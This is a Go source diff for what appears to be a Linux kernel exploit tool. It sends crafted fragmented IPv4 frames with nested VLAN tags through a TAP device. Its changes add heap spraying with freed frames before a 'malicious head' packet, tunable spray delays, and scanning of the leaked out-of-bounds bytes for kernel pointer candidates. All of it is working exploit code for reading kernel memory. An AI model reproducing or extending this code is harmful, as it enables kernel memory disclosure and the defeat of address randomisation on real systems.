@@ -65,6 +65,10 @@ type cfg struct {
 	gateway      string
 	dstMAC       string
 	egressWait   time.Duration
+	egressSpray  int
+	egressFill   byte
+	sprayDelay   time.Duration
+	vlanTags     int
 	answerDstARP bool
 	transport    string
 	udpSrcPort   int
@@ -76,9 +80,10 @@ type cfg struct {
 func parseCfg() cfg {
 	c := cfg{}
 	flag.IntVar(&c.head, "head", 8, "offset-0 fragment payload; this skb is the linear head (multiple of 8)")
+	flag.IntVar(&c.vlanTags, "vlan-tags", 2, "number of nested VID-0 tags before IPv4 (at least 2)")
 	flag.IntVar(&c.rest, "rest", 400, "payload carried in the completing fragment")
-	flag.IntVar(&c.tebar, "tebar", 0, "same-sized frames to allocate immediately before the head skb")
-	fill := flag.Int("tebar-fill", 0xee, "byte stored in tebar frames")
+	flag.IntVar(&c.tebar, "tebar", 0, "128-byte immediately-freed TAP frames written before the head skb")
+	fill := flag.Int("tebar-fill", 0xee, "payload byte stored in tebar frames")
 	captureMs := flag.Int("capture-ms", 800, "time to collect output fragments")
 	flag.IntVar(&c.count, "count", 1, "number of samples; batches buffer output until all samples finish")
 	flag.BoolVar(&c.page, "page", false, "force a page_frag head (TUNSETSNDBUF=INT_MAX, nonblocking write)")
@@ -90,6 +95,9 @@ func parseCfg() cfg {
 	flag.StringVar(&c.src, "src", "", "source IPv4 override (default: interface address)")
 	flag.StringVar(&c.gateway, "gateway", "", "next-hop IPv4 override (default: /proc/net/route)")
 	flag.StringVar(&c.dstMAC, "dst-mac", "", "next-hop MAC override (default: /proc/net/arp)")
+	flag.IntVar(&c.egressSpray, "egress-spray", 0, "128-byte immediately-freed host-TAP frames sent before each malicious head")
+	egressFill := flag.Int("egress-spray-fill", 0xee, "payload byte stored in egress spray frames")
+	sprayDelayUS := flag.Int("spray-delay-us", 1000, "delay after predecessor frames, allowing them to be freed before the malicious head")
 	flag.BoolVar(&c.answerDstARP, "answer-dst-arp", false, "answer ARP for -dst so host-routed fragments hairpin back to this interface")
 	flag.StringVar(&c.transport, "egress-transport", "udp", "egress carrier: udp or raw253")
 	flag.IntVar(&c.udpSrcPort, "udp-source-port", 0x0101, "UDP source port (also the first two post-mutation IPv4 option bytes)")
@@ -99,10 +107,16 @@ func parseCfg() cfg {
 	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
 	flag.Parse()
 	c.tebarFill = byte(*fill)
+	c.egressFill = byte(*egressFill)
+	c.sprayDelay = time.Duration(*sprayDelayUS) * time.Microsecond
 	c.capture = time.Duration(*captureMs) * time.Millisecond
 	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
 	if c.head < 8 || c.head%8 != 0 || c.head > 40 {
 		fmt.Fprintln(os.Stderr, "-head must be a multiple of 8 in 8..40")
+		os.Exit(1)
+	}
+	if c.vlanTags < 2 || c.vlanTags > 128 {
+		fmt.Fprintln(os.Stderr, "-vlan-tags must be in 2..128")
 		os.Exit(1)
 	}
 	if c.rest < 16 {
@@ -119,6 +133,14 @@ func parseCfg() cfg {
 	}
 	if c.egress && c.count > 65536 {
 		fmt.Fprintln(os.Stderr, "egress -count must not exceed 65536 unique IPv4 IDs")
+		os.Exit(1)
+	}
+	if c.egressSpray < 0 || c.egressSpray > 4096 {
+		fmt.Fprintln(os.Stderr, "-egress-spray must be in 0..4096")
+		os.Exit(1)
+	}
+	if *sprayDelayUS < 0 || *sprayDelayUS > 1000000 {
+		fmt.Fprintln(os.Stderr, "-spray-delay-us must be in 0..1000000")
 		os.Exit(1)
 	}
 	if c.egressRest < 64 || c.head+c.egressRest > 65515 {
@@ -221,7 +243,7 @@ func verifyWrite(tap *os.File, cap *capture, c cfg) error {
 		return fmt.Errorf("solver found no adjustment for checksum word 0x%04x", c.csumWord)
 	}
 	pkt := datagram(0x1111, payload)
-	if err := writeTap(tap, frame(pkt), true, csumAtIP, uint16(c.csumOffset)); err != nil {
+	if err := writeTap(tap, frameWithVLAN(pkt, c.vlanTags), true, uint16(l2LenForTags(c.vlanTags)), uint16(c.csumOffset)); err != nil {
 		return err
 	}
 	got := cap.collect(500*time.Millisecond, observedID(c, 0x1111))
@@ -264,18 +286,25 @@ func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 	if verbose {
 		printHead(c)
 	}
-	second := frame(egressFragment(c.head, false, payload[c.head:], ipID, src, dst, proto))
-	if err := writeTap(tap, second, true, l2Len+ipLen, 0); err != nil {
+	second := frameWithVLAN(egressFragment(c.head, false, payload[c.head:], ipID, src, dst, proto), c.vlanTags)
+	if err := writeTap(tap, second, true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
 		return nil, err
 	}
-	tebar := frame(datagram(0x1000, bytesRepeat(c.head, c.tebarFill)))
+	tebar := egressSprayFrame(
+		net.HardwareAddr{0x02, 0x00, 0x00, 0x00, 0x00, 0x02},
+		net.HardwareAddr{0x02, 0x00, 0x00, 0x00, 0x00, 0x01},
+		c.tebarFill,
+	)
 	for i := 0; i < c.tebar; i++ {
 		if err := writeTap(tap, tebar, false, 0, 0); err != nil {
 			return nil, err
 		}
 	}
-	first := frame(egressFragment(0, true, payload[:c.head], ipID, src, dst, proto))
-	if err := writeTap(tap, first, true, csumAtIP, uint16(c.csumOffset)); err != nil {
+	if c.tebar > 0 && c.sprayDelay > 0 {
+		time.Sleep(c.sprayDelay)
+	}
+	first := frameWithVLAN(egressFragment(0, true, payload[:c.head], ipID, src, dst, proto), c.vlanTags)
+	if err := writeTap(tap, first, true, uint16(l2LenForTags(c.vlanTags)), uint16(c.csumOffset)); err != nil {
 		return nil, err
 	}
 	pkts := cap.collect(c.capture, observedID(c, ipID))
@@ -329,6 +358,7 @@ func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 		if verbose {
 			fmt.Printf("  past-linear hex=%s ascii=%q nonzero=%d/%d\n",
 				hex.EncodeToString(host), string(host), nonzero, len(host))
+			printKernelPointerCandidates("  ", host)
 		}
 	}
 	if verbose {
@@ -427,17 +457,30 @@ func forwardTTL(pkt []byte) {
 	pkt[11] = byte(raw >> 8)
 }
 func frame(ip []byte) []byte {
-	f := make([]byte, l2Len+len(ip))
+	return frameWithVLAN(ip, 2)
+}
+
+func frameWithVLAN(ip []byte, tags int) []byte {
+	l2 := l2LenForTags(tags)
+	f := make([]byte, l2+len(ip))
 	copy(f[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
 	copy(f[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
 	binary.BigEndian.PutUint16(f[12:], vlanProto)
-	binary.BigEndian.PutUint16(f[14:], 0)
-	binary.BigEndian.PutUint16(f[16:], vlanProto)
-	binary.BigEndian.PutUint16(f[18:], 0)
-	binary.BigEndian.PutUint16(f[20:], ipProtoEth)
-	copy(f[l2Len:], ip)
+	off := ethLen
+	for i := 0; i < tags; i++ {
+		binary.BigEndian.PutUint16(f[off:], 0)
+		proto := uint16(vlanProto)
+		if i == tags-1 {
+			proto = ipProtoEth
+		}
+		binary.BigEndian.PutUint16(f[off+2:], proto)
+		off += vlanLen
+	}
+	copy(f[l2:], ip)
 	return f
 }
+
+func l2LenForTags(tags int) int { return ethLen + tags*vlanLen }
 
 func writeTap(tap *os.File, frame []byte, csum bool, start, offset uint16) error {
 	buf := make([]byte, 10+len(frame))
@@ -550,14 +593,14 @@ func openTap(name string, page bool) (*os.File, error) {
 }
 
 func printHead(c cfg) {
-	frameLen := l2Len + ipLen + c.head
+	frameLen := l2LenForTags(c.vlanTags) + ipLen + c.head
 	past := 60 - (ipLen + c.head)
 	via := "slab skb (tun_alloc_skb)"
 	if c.page {
 		via = "page_frag skb (tun_build_skb)"
 	}
-	fmt.Printf("head: payload=%d frame=%d linear_after_strip=%d copy=60 past_headlen=%d via=%s tebar=%d fill=0x%02x\n",
-		c.head, frameLen, ipLen+c.head, past, via, c.tebar, c.tebarFill)
+	fmt.Printf("head: payload=%d frame=%d vlan_tags=%d linear_after_strip=%d copy=60 past_headlen=%d via=%s tebar=%d fill=0x%02x\n",
+		c.head, frameLen, c.vlanTags, ipLen+c.head, past, via, c.tebar, c.tebarFill)
 }
 
 func ipChecksum(h []byte) uint16 {
